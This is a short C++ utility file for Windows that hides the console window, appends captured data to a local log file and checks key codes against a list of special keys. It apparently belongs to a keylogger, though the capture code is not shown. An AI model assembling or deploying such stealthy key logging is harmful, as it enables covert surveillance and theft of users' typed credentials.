//
// Created by Dan on 8/23/2022.
//

#include "utils.hpp"

#include <algorithm>

#define LOGGING_FILE "../log-data.txt"

namespace utils {

    void hide_terminal() {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    }

    void save_log_data(const std::string & data) {
        std::fstream output_stream;
        open_file_stream(output_stream, LOGGING_FILE, std::ios::app);

        output_stream << data;

        output_stream.close();
    }

    void open_file_stream(std::fstream & file_stream,
                                 const std::string & file_name, const std::ios_base::openmode opening_mode) {
        file_stream.open(file_name, opening_mode);

        if (file_stream.fail()) {
            throw std::runtime_error(current_function_name + "cannot open " + file_name);
        }

        if (!file_stream) {
            throw std::runtime_error(current_function_name + "cannot open " + file_name);
        }
    }

    bool is_special_char(const int key_code) {
        return std::any_of(std::begin(special_keys_codes), std::end(special_keys_codes),
                    [&](const int & special_key_code) -> bool { return special_key_code == key_code; });
    }
}